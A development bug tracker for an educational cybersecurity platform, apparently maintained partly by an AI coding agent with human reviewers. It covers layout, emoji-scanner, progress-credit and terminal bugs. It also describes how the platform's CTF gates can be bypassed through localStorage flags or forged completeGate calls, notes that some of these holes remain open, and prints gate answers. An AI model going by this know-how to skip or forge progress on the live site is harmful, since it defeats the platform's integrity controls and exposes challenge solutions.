# Bug Tracker

> The running ledger of **real bugs found during work** — QC catches (Nancy/Chris/Karl), user
> reports, and live incidents. Newest first. Move an entry to **Resolved** only when the fix is
> deployed AND verified.

**What goes where (so we don't scatter):**
| Surface | For | Where |
|---------|-----|-------|
| **This tracker** | Human-found bugs during work / QC / user reports / live incidents | `_docs/operations/BUG_TRACKER.md` |
| Nexus / EduScan → Pulse | Automated scanner findings (13k+) | `_triage_queue` / `_auto_fix_queue`, `pulse.html` |
| Sprint Master | Planned/scheduled work items | `_tools/sprint-master/sprints.json` |
| Marathon backlog | Side-discoveries to work during marathon time | memory `project_marathon_backlog.md` |

**Entry schema** (copy this):
```
### BUG-NNN — <one-line title>  ·  [severity P0-P3]  ·  [status]
- **Found:** YYYY-MM-DD · by <Nancy|Chris|Karl|user|scan|self> · in <session/task>
- **Area:** <file:line or feature>
- **Symptom:** <what goes wrong, for whom>
- **Repro:** <steps / inputs>
- **Root cause:** <why>
- **Fix:** <commit(s)> — <what changed>
- **Verified:** <who / how>
- **Related:** <links / other BUG-NNN>
```
Severity: **P0** live student-facing harm / data loss · **P1** broken feature or integrity · **P2** wrong-but-contained · **P3** cosmetic/hygiene.
Status: `open` · `in-progress` · `fixed-not-deployed` · `resolved`.

---

## Open

### BUG-049 -- HubDiscovery painted admin-hub content OUTSIDE the Observatory consent gate  ·  P1  ·  fixed-not-deployed
- **Found:** 2026-07-29 · by self (probing why anonymous harness runs saw a Cloud Master card while house panels were empty) · confirmed independently by Nancy · during the dynamic-hub placement fix
- **Area:** the retired `_app/components/HubDiscovery.js` include pattern -- pre-fix `observatory/index.html:1799-1800` carried `<div data-hub-discovery>` + the script include as bare unconditional lines before `</body>`
- **Symptom:** Observatory renders house content only inside `ObservatoryConsent.ensureConsent(function () { HouseRenderer.init(...) })` (observatory/index.html:1693-1694) -- but HubDiscovery ran ungated, so an unconsented (or anonymous) visitor saw the Cloud Master hub card on a research house whose entire design premise is consent-gated content. Research-integrity issue, not cosmetic: the consented/unconsented boundary leaked.
- **Repro (pre-fix):** anonymous browser, load /houses/observatory/index.html -- house panels absent (gate holds) yet the Cloud Master card renders at top via the mount div.
- **Root cause:** the mount div + script include lived in static HTML, outside every runtime gate; HubDiscovery had no knowledge of the consent system.
- **Fix (uncommitted, riding the dynamic-hub placement change):** HubDiscovery include + mount removed from all 12 pages; dynamic hubs now render only via `mergeDynamicHubs()` inside HouseRenderer, which on Observatory runs inside the consent callback. Verified via stub harness (`.scratch_verify/hr-merge-2026-07-29/`, output saved): consented path renders the card exactly once in the Courses grid; ungated top render gone.
- **Verified:** stub-harness PASS re-run from repo copy (stub-verify-output.txt); post-deploy live check pending.
- **Related:** BUG-047 arc (same session), unified-hub-registry.md "Cloud Master: distribution hubs and dynamic-hub placement".

### BUG-047 -- cert hub pages render in a 47% column with seven emoji  ·  P2  ·  deployed-verified
- **Found:** 2026-07-29 · by user (Frank, first-impression review of Cloud Master) · in the hexify marathon
- **Area:** `_app/components/CertPathRenderer.js:184` (`.wrap{max-width:900px}`) and `:16-19` (`TYPE_ICONS`)
- **Symptom:** "it looks bad! it looks basic, bad and silly images and emojis, the content is smooshed
  into a thin 33% middle strip." Measured live at a 1920px viewport: content occupied 900px = **47%**
  of the screen, with 9 emoji nodes rendered per page. Frank found it on Cloud Master, but the defect is
  in a SHARED component serving **14 cert hub pages** (those calling `CertPathRenderer.init(`): aws-ccp,
  aws-developer, azure-fundamentals, ccna, casp-plus, comptia-linux, comptia-network, cryptography-track,
  cysa-plus, devops-fundamentals, aplus-core1, aplus-core2, security-operations, security-plus-crypto.
  **Count correction (Chris):** I first said 15 and included `houses/eye/index.html`. That was a grep match
  on a *comment* at `eye/index.html:128` referring to a different house; eye renders via HouseRenderer and
  is NOT affected. Grep for the call, not the name.
- **Repro:** open any of the 15 at 1920px. Content sits in a centred 900px column; each module row shows
  an emoji glyph in its `.mtype` span.
- **Root cause (two, independent):**
  1. `.wrap{max-width:900px}` — a direct violation of the never-narrow-centered-layout hard rule.
  2. `TYPE_ICONS` held seven real emoji written as `\u{1F4D6}`-style **escape sequences**. That escaping
     is why they survived a no-emoji platform: EduScan's EMOJI-005 scans for actual glyphs (an escape is
     ASCII text, not a glyph) and EMOJI-001/006 only inspect properties literally named `icon:`, while
     these sat under keys named `presentation:`, `lab:`, `quiz:` and so on. **Neither rule could fire.**
- **Fix:** `.wrap` 900px -> 1600px + 32px padding; `.mlist` converted from a single-column flex list to
  `repeat(auto-fill,minmax(360px,1fr))`; the 7 emoji replaced with 7 visually distinct webp icons via a
  new `typeIconHTML()`; `.mtype img` sized 18x18. Same container/grid fix applied to
  `_app/houses/cloud/cloud-essentials/index.html` and `_app/houses/cloud/az-104/index.html` (both 1100px = 57%).
  Nancy returned PAUSE on the first plan — a bare max-width bump would have stretched each row into dead
  space because `.minfo{flex:1}` wraps an inline `.mtitle` with no width; the multi-column grid is her fix.
- **Verified:** puppeteer at 1920/1366/1024. CertPathRenderer pages: 9 of the 14 render a path in the
  harness — all show `.wrap` 1600px, 4/3/2 columns, 0 emoji, type icons rendering with 0 broken and 0
  showing literal ".webp" text; first-row card heights uniform [82,82,82,82].
- **Chris BLOCK, then fixed — the first fix recreated Frank's complaint.** Applying the same auto-fill grid
  to `az-104` and `cloud-essentials` was wrong: **all 18 of az-104's content-grid blocks hold exactly ONE
  card** (cloud-essentials' hold 2-3). `auto-fill` pre-allocates four tracks regardless, stranding a lone
  card at the left with **~970px of dead space** beside it. `auto-fit` fails the other way, stretching one
  card across the full container. Real fix: `.week-inner` became a flex-wrap row so the three subsections
  (Presentation / Lab / Assessment) sit **side by side**, with full-width children opting out via
  `flex-basis:100%`. Re-measured with accordions force-expanded: dead space **970px -> 22px** (the column
  gap), 3 subsections per row at 1920 and 1366, 2 rows at 1024, cards 483px.
- **My verification error, again (6th instance of the same pattern):** the screenshots I first submitted as
  evidence showed the accordions **collapsed**, so the `.content-grid` cards were never rendered or visible.
  My "79%/91%/88%" numbers measured `.container` width — a proxy — not the card grid the change targeted.
  Measure the thing the change touches, in the state where it is visible.
- **Open follow-up:** EduScan cannot detect this class (escaped emoji under non-`icon:` keys). Until a rule
  exists, the platform can regress here silently. See BUG-048.
- **Deployed + live-verified:** ./deploy.sh 2026-07-29 ~10:50 EDT, all gates green (Chris marker re-recorded
  for HEAD 34bb56420 first; Nancy PROCEED with 3 conditions met). Live production measurements: CertPathRenderer.js +
  az-104 + cloud-essentials md5-match the fix commit; puppeteer at 1920px on aws-ccp/azure-fundamentals/casp-plus =
  wrap 1600px, 4 columns, all webp icons rendering, 0 emoji; az-104 with accordions force-expanded = 6/6 chapter rows
  side-by-side, max dead space 22px; openstack hub 458px cards 4/row, h2 titles styled. The 5 pages the harness could
  not render are structural: 4 are 0-second redirect stubs (ccna, cysa-plus, aplus-core1/2) and 1 is the admin-gated
  workshop page (security-plus-crypto) -- live-confirmed the redirects fire and the gate blocks.
- **Related:** BUG-048 · memory `feedback_never_narrow_centered_layout` · CLAUDE.md rule 2

### BUG-048 -- EduScan cannot see emoji written as unicode escapes  ·  P3  ·  open
- **Found:** 2026-07-29 · by Nancy (reviewing the BUG-047 fix plan) · confirmed by reading the validator
- **Area:** `_tools/eduscan/validators/syntax/emoji.js`
- **Symptom:** the platform's no-emoji rule is unenforceable against `'\u{1F4D6}'`-style literals. EMOJI-005
  matches real glyph characters, so escape-sequence source text never trips it; EMOJI-001/006 only examine
  properties literally named `icon:`. Seven emoji therefore shipped across 15 pages undetected (BUG-047).
- **Scale (swept 2026-07-29, `_app` excluding vendor/_archive):** **455 escaped occurrences across 221
  files.** Be precise about what that number is, because most of it is not the violation Frank complained about:
  - **Pictographic emoji — the "silly images" class, ~15 files.** `components/ThreatAppletRenderer.js`
    (18: 🛡⚡📖🔍🧠📋🔑📊🌍🔗🛠🎯), `houses/ai/games/ai-red-team-challenge.applet.html` (7),
    `arena/tournament-podium.html` (🥇🥈🥉), `components/GlobalSearch.js` (🔍📁📄),
    `hive/engine/MapRenderer.js` (🖥🔒📄), five `*-text-adventure-*.html` games (🔇🔊 mute toggles),
    `houses/code/armory/rust/arm-rs-02-variables.module.html` (😀), and 11 `arena/boxes/*/config.js` (✅).
  - **Typographic marks — the large majority.** ✓ ✗ ⚠ ★ ♥ ♡ ⚙ ⚑ used as UI glyphs (checkmarks in ~120
    lab/module files, the ♡ favourite control on house pages, arena/game symbols). These are a style
    question, not the same violation, and changing 221 files carries real regression risk. **Not fixed
    tonight on purpose** — flagged for a scoped decision.
  - Sweep caveat: the scan flags `CertPathRenderer.js:17`, which is now only the **explanatory comment**
    naming the old escape. A future rule must not re-report comments.
- **CORRECTION 2026-07-29 -- the "~15 pictographic files" figure above was WRONG (a ~10x undercount).**
  The first sweep counted only the `\u{1F...}` brace form. Re-measured with
  `_tools/eduscan/bug048-classify.js`, which classifies ALL THREE escape forms (brace, surrogate-pair
  `\uD8xx\uDCxx`, bare BMP) against the validator's own EXCLUDED_CHARS/EXCLUDED_CODEPOINTS sets
  (emoji.js:26-48, 66-85) and its emoji ranges (line 22); output reproduced independently by Nancy:
  **198 files / 1,523 true-pictographic occurrences**, plus 169 files / 307 excluded-typographic.
  The surrogate-pair form alone covers ~120 `arena/boxes/*/config.js` files (136 configs exist),
  invisible to both earlier greps. Two findings that shape the fix:
  1. Those ~120 arena configs share a repeating ~8-icon vocabulary rendered by BoxEngine, so the
     natural fix is an engine-level icon map + a scripted config sweep, not 198 hand edits.
  2. The validator's own line contradicts the sweep prose above: U+26A0 (warning sign) and U+2699
     (gear) are NOT in EXCLUDED_CODEPOINTS, so the validator counts them as real emoji while the
     sweep filed them under typography. Reconciling that is part of the scope ruling.
  No content file was touched in this pass. Scope remains a decision returned to Frank: taskboard #242.
- **Consequence for verification:** "EduScan passed" is **not** evidence for this class of defect, in either
  direction. Fixing BUG-047 produced zero EduScan signal, so a visual render check was used instead.
- **Fix:** not written. Needs a rule that decodes `\u{...}` / `\uXXXX` escapes in string literals before the
  emoji scan, independent of the property name.
- **Related:** BUG-047

### BUG-044 -- completeGate rubber-stamps any gate for any signed-in user  ·  P1  ·  deployed (two residuals below still open)
- **Found:** 2026-07-28 · by Chris (blocking my BUG-043 half-B write-up) · verified independently by me
- **Area:** functions/index.js:99-138 (`exports.completeGate`)
- **Symptom:** the function writes `users/{uid}/gates/gate{N}` with `completed: true` for ANY signed-in
  caller. Its only real check is that the previous gate's doc exists. The proof check is
  `if (proof && gateNum <= 5)` -- so an empty/absent proof skips validation entirely, for every gate.
  Gates 6-8 call it exactly that way by design (`proof: ''`), and nothing stops a console caller from
  doing the same for gates 1-13 in ascending order, fabricating a complete, server-blessed vault
  without solving anything. Because prerequisites are checked against the same forged docs, a simple
  ascending loop satisfies them.
- **Why it matters beyond the obvious:** this is the authority BUG-043's half B was going to rely on.
  Hydrating gate state from the server does not close the vault bypass while the server will mint a
  completion on request; it just moves the forgery from localStorage to Firestore.
- **FIXED (this commit):** completeGate now fails CLOSED. A `CLIENT_ATTESTED_GATES = [6,7,8]`
  allowlist replaces the `gateNum <= 5` threshold; any gate not on the list must present a valid
  proof, and none can be produced (generateGateProof HMACs with FLAG_SECRET, which is
  crypto.randomBytes at module load, functions/index.js:35 -- unguessable and different every
  deploy). So completeGate is closed for gates 1-5 and for any future gate number; the threshold
  form would have failed OPEN for every gate above 5 ever added (Nancy). All three gate-doc writers
  now stamp provenance: validateGateAnswer's two branches (the gate-5 hash-array branch and the
  generic one) write `verified: true, source: 'server'`; completeGate writes
  `verified: false, source: 'client-attested'` for 6-8, so a reader can finally tell a
  server-validated completion from a student's own say-so.
- **DROPPED from the plan (Nancy):** a prerequisite check requiring the previous gate to be
  `verified !== false`. Every pre-existing doc has `verified` undefined, so it would have passed for
  everything on day one, and once gates 1-5 cannot be forged there is no chain left for it to break.
  Inert code that reads as hardening is worse than no code.
- **Verified, and re-runnable:** `node _tools/security/verify-gate-completion.js` (6 checks, exit 0
  = safe). It extracts the LIVE completeGate body out of functions/index.js and executes it over an
  in-memory Firestore double, so it tests shipped code rather than a re-implementation: the ascending
  console loop with empty proof writes ZERO docs and dies at gate 1 with permission-denied; gates 6-8
  still complete once 1-5 exist as server-validated docs and are recorded client-attested; an
  unlisted future gate is rejected; unauthenticated callers are refused. Proven to actually catch a
  regression: restoring the old `if (proof && gateNum <= 5)` shape makes it fail with 8 forged docs.
  (Nancy's ask -- a "Verified" line should point at something a reader can execute, not prose.)
- **RESIDUAL 1 -- pre-existing forged progress is NOT remediated.** This fix is forward-only. Any
  account that ran the loop before this deploy keeps every forged gate doc and all the access it
  grants; verifyGateAccess (functions/index.js:145-165) and FirestoreManager._restoreGateProgress
  (_app/components/FirestoreManager.js:109-144) both grant on `completed` alone and never consult
  `verified`. Cleaning that up means auditing existing gate docs (now possible: legitimate future
  ones carry provenance, but historical ones carry none, so age is the only discriminator) and
  deciding whether to revoke -- an operator call, not started.
- **RESIDUAL 2 -- gates 6-8 remain self-attested.** Their multi-step work is validated by
  client-side predicates (gate-6.html:1166+, gate-7.html:1171, gate-8.html:1607+), so a signed-in
  student can still skip 6-8 by calling completeGate directly. Closing it needs real server-side
  validation of those puzzles: taskboard #237. Note these two residuals are DIFFERENT holes and
  neither is closed by the other.
- **Deployed:** functions deploy 2026-07-28 20:43 EDT (gcloud completeGate updateTime 2026-07-29T00:43:36Z, 3 min 20 s after fix commit 177acbf3a at 20:40:16 EDT; working tree had no uncommitted functions changes). Fail-closed source confirmed shipped; behavior not re-exercised in production (forging a gate completion on prod to prove fail-closed would write junk to production state). The two residuals -- pre-existing forged progress unremediated, gates 6-8 still client self-attested (task #237) -- remain open.
- **Related:** BUG-043 (blocked on this), taskboard #237.

### BUG-042 -- Dark Arts gates are unpassable for signed-out students, and the error blames the student  ·  P1  ·  partially-fixed (message), access policy open
- **Found:** 2026-07-28 · by user report (Frank: "users are reporting problems with Gate 5") · reproduced live
- **Area:** _app/dark-arts/gate-cipher.js checkAnswerServer (~:53-85) + all five gate pages' identical `serverResult !== null ? serverResult : false` (gate-1.html:275, gate-2.html:279, gate-3.html:311, gate-4.html:519, gates/gate-5.html:439-441)
- **Symptom:** a student who is house-sorted but NOT signed in can never clear ANY gate. checkAnswerServer returns null when `FirebaseAuth.isSignedIn()` is false (the client-side hash fallback was retired in the 2026-02 rotation and now always returns null), every gate coerces null to `false`, and the page shows "The synthesis is incomplete." So a correct answer is reported as wrong, with no hint that sign-in is required. Gate 5 draws the reports because it is the vault entrance and the last one students reach.
- **Repro (live, hexworth.com):** seed only `hexworth_house`, open /dark-arts/gates/gate-5.html, submit the correct Gate 4 code (1973 for the current cipher set) + any binding word -> `FirebaseAuth.isSignedIn() === false`, `GATE_CIPHER.checkAnswerServer(4,'1973')` returns `null`, error "The synthesis is incomplete." shows, `gate5_complete` stays null.
- **Note:** the pages gate on `AccessGuard.require('sorted')`, which does NOT imply signed-in -- that mismatch is the whole bug. Server validation itself is correct (validateGateAnswer handles gate 5's hash ARRAY properly; gate_registry/set_2 has all five keys).
- **Fix SHIPPED (option b, the half needing no ruling):** all five gates now branch on null BEFORE coercing. A dedicated #gateNotice element (never touching the static wrong-answer copy, which the rate-limit branch owns) shows a message chosen from the live auth state: "Sign in to verify your answer." when auth is available and the student is signed out, "Could not verify your answer. Check your connection and try again." otherwise (null also arises when FirebaseAuth is unavailable or a Cloud Function call fails transiently while signed in -- Nancy's catch; a blanket sign-in message would have been a fresh falsehood). Gate 5 shows the notice when EITHER half is unverifiable rather than claiming the synthesis is wrong.
- **Verified:** three-branch harness over all five gates, 15/15 -- unverifiable shows the notice and leaves the gate closed; a server-verified wrong answer still shows each gate's own copy ("ACCESS DENIED", "SEQUENCE INVALID", ...); a correct answer still completes the gate. Re-executed independently by Chris.
- **STILL OPEN (operator ruling):** option (a) -- whether gate pages should require sign-in via AccessGuard so the situation cannot arise at all. The shipped message makes the blocker honest; it does not remove it.
- **Related:** BUG-043 (same audit).

### BUG-043 -- Gate answers are readable in dev tools, and the vault opens on client-side flags alone  ·  P1  ·  half A fixed, half B blocked on a structural gap
- **Found:** 2026-07-28 · by user report (Frank: "they can access the solutions via dev tools (f12)") · both halves reproduced live
- **Area:** _app/dark-arts/gate-cipher.js SETS (~:10-40); AccessGuard gate checks reading `localStorage.gate{N}_complete`
- **Symptom A (answers in the client):** gate-cipher.js ships all four cipher sets to every visitor. Its own header claims "No plaintext answers exist in this file", which is false: `gate4: { code: '1973' }` is the literal Gate 4 answer for the active set, needing no decoding, and it is also half of Gate 5's synthesis input. Gates 1-3's hex/base64 are one command from plaintext ("beneath the code lies meaning", "shadows teach the patient mind", "hidden layers guard the path"). Anyone who opens Sources reads the month's solutions. PRECISION (Nancy): gate-5.html never reads `.gate4.code` -- it asks the student to retype the Gate 4 code and validates it server-side, so the leak hands over half of Gate 5's input by giving away Gate 4's answer, not through any code coupling between the files.
- **Symptom B (progress is client-trusted):** setting `gate1..8_complete = 'true'` in the Application tab opens /dark-arts/vault/index.html at Master rank with no server check (verified live: full 8.5KB vault UI renders). Server-verified completions ARE written to users/{uid}/gates/{gateN} by validateGateAnswer, but nothing reads them back -- the client flag is the only thing consulted.
- **Constraint to respect when fixing A:** Gate 4 synthesizes DTMF audio in the browser, so the tone sequence has to exist client-side in some form; the honest fixes are pre-rendered audio served as an asset, or per-user server-issued codes. Obfuscating the string in place is not a fix.
- **HALF A FIXED (this commit):** Gate 4's tones are now a committed asset per cipher set
  (_app/assets/audio/dark-arts/gate4-set{0..3}.wav, 35KB each, 8kHz mono PCM). gate-cipher.js
  carries the audio URL instead of `code`, and gate-4.html plays the file rather than
  synthesizing from the answer; DTMF_FREQS/playTone/initAudio/DTMF_CODE are gone. The
  visualizer takes its duration from the decoded audio, so the page never learns the digit
  count. The file's header claim ("No plaintext answers exist in this file") was false while
  gate4 shipped a bare code and has been rewritten to say what actually ships and why.
- **Verified (Half A):** the four WAVs were generated offline in node, then measured by
  the scratchpad's measure_freqs.py -- a separate Python/scipy FFT that takes the strongest peak in
  each band by unconstrained argmax (no DTMF table consulted during measurement) and only then
  snaps the observed Hz to the PUBLISHED ITU-T Q.23 values. (An earlier prototype in the same
  directory, verify-dtmf.py, DOES evaluate magnitude at the known frequencies; it is not what
  produced this evidence. Chris independently re-verified with his own unconstrained-peak
  script and matched within 1-2 Hz on all 16 digits.) -- all four decode to their intended codes
  (0451/2600/1973/8139) with every tone within 8 Hz of standard. Browser check: the answer is
  absent from gate-cipher.js source, from the page HTML, and from globals; the signal plays,
  the visualizer animates, the button resets; gate branch suite still 15/15.
  HONEST LIMIT: no human has listened to these files -- I cannot hear audio. A human listen
  against the on-page frequency table is worth doing before students rely on it.
- **HALF B NOT FIXED. CORRECTION (Chris, blocking review):** my first diagnosis here was WRONG
  and is retracted. I wrote that gates 6-8 have no server completion path; they do --
  gate-6.html:1292, gate-7.html:1301 and gate-8.html:1795 all call the `completeGate` Cloud
  Function, which writes users/{uid}/gates/gate{N}. verifyGateAccess also loops i=1..gateNum
  with no cutoff at 5, so it does not "hit a wall" past gate 5 either. The real problem is not
  a missing server record; it is that the server record is not worth anything (see BUG-044).
- **What Half B actually requires (new scope, operator decision):** BUG-044 first (make server
  gate completion mean something), then extend the existing trust-then-verify mechanism
  (AccessGuard._verifyGateAsync + verifyGateAccess, AccessGuard.js:137-186,
  functions/index.js:145-165) to grant/revoke across gates 1-8 rather than building a second,
  competing hydration path. Plus the still-open ruling on whether gate pages and the vault
  should require sign-in -- without it a signed-out visitor keeps the localStorage bypass no
  matter what the signed-in path enforces.
- **Severity note:** this is a CTF-style teaching gate, not an assessment of record, so the impact is a student skipping content rather than grade fraud. Filed P1 anyway because the platform's own docs claim server-side authority that does not hold end to end.
- **Related:** BUG-042 (same audit); operator sync build (the hydration pattern option B would follow).

### BUG-040 -- BLACKSITE: sections 2-4 were unplayable; the terminal never rebound on tab switch  ·  P1  ·  deployed-verified
- **Found:** 2026-07-28 · by self (played it as a student, puppeteer, against production) · Frank asked to verify the Grep & Pipe Mastery BLACKSITE levels are completable
- **Area:** _app/components/BlacksiteTerminal.js loadModule() (~:280) + _app/components/CLHTerminal.js:3512 (constructor binds keydown directly to the input node)
- **Symptom:** only TRACE was playable. Switching to DECODE / EXTRACT / DEFUSE rendered the new objectives but every command still executed against the PREVIOUS section's filesystem, so nothing could be completed. Live scores before the fix: TRACE 7/8, DECODE 0/8, EXTRACT 0/8, DEFUSE 0/6 (22 of 30 objectives unreachable). Visible tell: on DECODE, `grep "^2024" intercepted_codes.log` answered `No such file or directory` under the prompt `analyst@logserver:/var/log$` (TRACE's host), not DECODE's `intelserver`.
- **Root cause:** loadModule dropped its reference to the old CLHTerminal and built a new one on the SAME input node, but CLHTerminal binds its keydown handler to that node and exposes no teardown (no destroy(), no removeEventListener anywhere in the 16k-line component). The stale listener fired first, ran the command against the old module, and cleared the input, so the new terminal only ever saw an empty string. Clinching detail: on EXTRACT, typing `wc -l` ticked exactly one objective -- the STALE TRACE instance completing its own `-l` objective, marked into the freshly rendered EXTRACT panel.
- **Fix:** this commit -- loadModule replaces the input element with a clone before constructing the new terminal, detaching every stale listener at once. Scoped to BlacksiteTerminal because it is the only multi-instance consumer (91 files construct CLHTerminal; each creates exactly one per page). **Known gap, named not silent:** CLHTerminal still has no teardown by design; any FUTURE second multi-instance consumer will hit this same class and should get a real destroy() rather than repeating the clone-swap. The fix also depends on loadModule staying synchronous between the swap and the rebuild (noted in a code comment).
- **Verified:** student playthrough (types each objective's taught command, answers all four CRITICAL DECISION modals correctly): 8/8 + 8/8 + 8/8 + 6/6 = 30/30, each section on its own host (logserver / intelserver / forensics / evidence), zero page errors.
- **Deployed + live-verified:** hosting deploy ~2026-07-29 00:35 EDT (live files md5-match commit f145fdd16). Live functional check 2026-07-29 ~10:45 EDT on production: sorted-user puppeteer opened the applet, INITIATE MISSION, switched to each previously-dead section (regex, pipes, boss), typed a command in each -- terminal produced output in all 3 (output length 0 -> 48/44/44), 0 page errors.
- **Related:** BUG-041 (found in the same playthrough).

### BUG-041 -- BLACKSITE: two objectives could not be completed with the command they teach  ·  P2  ·  deployed
- **Found:** 2026-07-28 · by self (TRACE-7) and Nancy (DECODE-2) · same playthrough / review
- **Area:** _app/components/CLHConfig.js GPM-TRACE objective 7, GPM-DECODE objective 2
- **Symptom:** TRACE-7 ("List all files mentioning the bomb threat") teaches `grep -rl "bomb" /var/log/` but checked `cmd.includes('-l')`, and the string `-rl` does not contain `-l`. DECODE-2 teaches `grep -Eo "[0-9]+\..."` but checked `lowerCmd.includes('-o')`, and `-Eo` lowercases to `-eo`. A student following the hint exactly could never tick either. Verified by running the real check functions against their own taught commands: 28 of 30 passed, these 2 failed.
- **Root cause:** substring tests against the raw command string cannot see a flag letter that is not first after the dash.
- **Fix:** this commit -- shared `hasFlag(cmd, letter)` helper (whitespace tokenize, whole single-dash letter cluster) replaces the brittle substring tests on the pure single-flag checks in these modules (TRACE 1,2,3,4,5,7,8; DECODE 2,3). Phrase/pattern checks (`uniq -c`, `sort -rn`, `[0-9]`, `^`, `$`, the `-(A|B|C)\d` regex) are deliberately untouched: all pass their taught commands, so changing them is risk without a reproduced defect.
- **Scope of the false-positive improvement (precise, per Nancy):** hasFlag closes the GLUED quoted-token case -- `grep "-c" file` used to tick the -c objective and no longer does. It does NOT close a free-standing flag-shaped word inside a quoted phrase (`grep "some -v text" file` still ticks, exactly as before). That case is unchanged, not fixed, and is not exploitable by accident here since no taught search term is a single-letter flag word.
- **Verified:** all 30 objectives pass their taught commands; adversarial set passes (combined `-rl`/`-Eo`/`-ic` tick; `--long-format`, `-largefile.log`, quoted `"-l"`, and no-flag variants correctly rejected).
- **Deployed:** same ~2026-07-29 00:35 EDT hosting deploy as BUG-040 (live files md5-match f145fdd16). Source confirmed live; the two taught-command checks were verified in the 30/30 pre-commit playthrough but not re-exercised on production.
- **Related:** BUG-040.

### BUG-046 -- two container hubs are unreachable: their container never links them  ·  P2  ·  open
- **Found:** 2026-07-28 · by Nancy · while reviewing the taskboard #234 metric fix · verified independently
- **Area:** _app/houses/code/armory/index.html (missing card) and _app/houses/web/backbone/index.html:466 (card points elsewhere)
- **Symptom:** two registry hubs carry `parent` but their container's page never links them, so students cannot reach them from anywhere:
  - `python-graphics` (parent code-armory, /houses/code/armory/python-graphics/index.html, 13,576 bytes of real content). The Armory renders 17 cards including `python`, but zero reference python-graphics.
  - `backbone-forensics` (parent backbone, /houses/web/backbone/forensics/index.html, 14,687 bytes). The Backbone page HAS a forensics card, but its href is `houses/eye/forensics/index.html` -- a different hub in a different house. Backbone's own forensics page is linked from nowhere.
  Grep confirms neither path is referenced by any page; the only mentions are HubRegistry itself and an unrelated ForensicsData.js.
- **How it hid:** I classified the audit's 70 "surfaced on no house page" hubs by checking whether each carried a `parent` field and concluded all 70 were explainable noise. Carrying a parent is NOT the same as being linked by that parent. Nancy caught it by opening the container pages and tracing hrefs. Any fix that treats "has a surfaced parent" as reachable would have permanently hidden these two.
- **Fix direction (operator decision, not started):** (a) add a python-graphics card to the Armory; (b) for Backbone, decide whether its forensics card should point at its OWN forensics page or deliberately cross-link Eye's -- if the cross-link is intended, backbone-forensics is redundant and should be retired rather than surfaced. Both are content calls, not mechanical fixes.
- **Related:** taskboard #234 (the metric fix, now correctly scoped), BUG-043's container-surfacing discussion.

### BUG-045 -- OperatorEngine credits course progress with one argument, so every mission writes the wrong bucket  ·  P1  ·  open
- **Found:** 2026-07-28 · by Nancy · during the BUG-039 review · verified independently against both files
- **Area:** _app/operator/engine/OperatorEngine.js:797 vs _app/components/ModuleProgress.js:533
- **Symptom:** `fireCompletionHooks` calls `window.ModuleProgress.complete(config.id)` with ONE argument, but the function is `complete(houseId, moduleId, options = {})`. So every completed operator mission records `houseId = <mission id>` (e.g. 'js-01') and `moduleId = undefined`. There is no arguments-length overload to compensate. Course progress for operator missions therefore lands in a bucket named after the mission with no module, instead of the mission's house.
- **Blast radius:** all 124 operator missions. Only 4 mission pages (the PFI ones) carry their own bridge, and those are separately broken by BUG-039; the other 120 rely solely on this call, so they have likely never credited course progress correctly.
- **NOT the same bug as the hub display:** the Operator hub's own completion marks read the engine's localStorage completion keys, which are written correctly. This is the ModuleProgress/course-credit path only.
- **Fix direction (not started):** pass both arguments -- the mission's house plus its module id. Needs a decision on what the module id should be for an operator mission (the config id? a catalog id?) and whether historical progress under the malformed bucket is worth migrating; do not guess.
- **Related:** BUG-039 (the PFI-specific bridge), operator sync work 2026-07-28.

### BUG-039 -- PFI Operator bridge polls a key the engine never writes (dash vs underscore)  ·  P2  ·  open
- **Found:** 2026-07-28 · by Nancy · during operator completion-fix review (her attack on "other hexworth_operator_ consumers")
- **Area:** _app/operator/missions/pfi-op-0{1..4}.mission.html (~:52, `COMP_KEY = 'hexworth_operator_' + MISSION_ID` = dashed `hexworth_operator_pfi-op-01`) and _app/houses/code/python-for-it/index.html:2332-2340 (same dashed read) vs _app/operator/configs/pfi-op-0*.config.js (`storageKey: 'hexworth_operator_pfi_op_01'` = underscored, which is what OperatorEngine actually writes)
- **Symptom:** the in-mission ModuleProgress bridge polls a key that never exists, so it NEVER fires; the python-for-it course page backfill reads the same wrong key. Students who complete PFI Operator missions get no course-progress credit. Silent no-op since the bridge shipped.
- **Root cause:** bridge and backfill derive the key from the dashed mission id; the configs define underscored storageKeys. Two conventions, no shared constant.
- **Fix (when scheduled):** point bridge + backfill at the configs' underscored storageKeys (or read both, migrate-forward). NOT fixed by the 2026-07-28 operator sync build -- that build hydrates the OPERATOR HUB's own keys; this bug is in the PFI course-credit path and remains open. Also decide whether historical underscored completions should be backfilled into ModuleProgress at fix time.
- **Related:** operator completion sync build 2026-07-28; BUG-037/BUG-038 (same hand-list drift family).

### BUG-038 -- CySA path duplication (originally filed as 12 orphaned learning-path links)  ·  P2  ·  resolved (mostly not a bug; CySA half retired)
- **Found:** 2026-07-28 · by self (completeness-checked by Nancy) · during Eye projection conversion, extending the AI-house near-miss to all cartridge-fied houses
- **Area:** _app/houses/{cloud,code,eye,key,script,shield}/index.html vs _app/components/LearningPaths.js + handler-dashboard.js PATH_HOUSE_MAP
- **Symptom:** ec74ee454 replaced object path-cards (which linked to path-view.html learning paths) with HubRegistry id strings (which link to hub pages). For 12 removed cards the underlying LearningPaths entries are REAL multi-module paths that now have ZERO UI entry points (grep-verified: no `path=<id>` links anywhere in _app). Students cannot reach them; any progress written under those path ids is stranded.
- **Full orphan table (per-pair ruling needed: is the HUB or the PATH the canonical destination?):**
  | house page | orphaned path id | path name | colliding hub card now shown |
  |---|---|---|---|
  | cloud | aws-ccp | AWS Cloud Practitioner | aws-ccp hub (same name) |
  | cloud | azure-fundamentals | Azure Fundamentals | azure-fundamentals hub (same name) |
  | code | devops-fundamentals | DevOps Fundamentals | devops-fundamentals hub (same name; also cross-housed, see audit WARN) |
  | code | aws-developer | AWS Developer | aws-developer hub (same name; cross-housed) |
  | eye | cysa-plus | CompTIA CySA+ (CS0-003) | eye-cysa hub (same cert) |
  | eye | security-operations | Security Operations (SOC Analyst) | security-operations hub (SAME id and name) |
  | key | cryptography-track | Cryptography Track | cryptography-track hub (same name) |
  | key | security-plus-crypto | Security+ Cryptography | NONE (hub is workshopped; path unreachability here is probably CORRECT per quarantine intent, confirm on ruling) |
  | script | comptia-linux | CompTIA Linux+ | comptia-linux hub (same name; cross-housed) |
  | script | devops-fundamentals | (duplicate of code row) | devops-fundamentals hub |
  | shield | cysa-plus | (duplicate of eye row) | eye-cysa hub carded on shield (cross-housed) |
  | shield | casp-plus | CompTIA CASP+ | casp-plus hub (same name) |
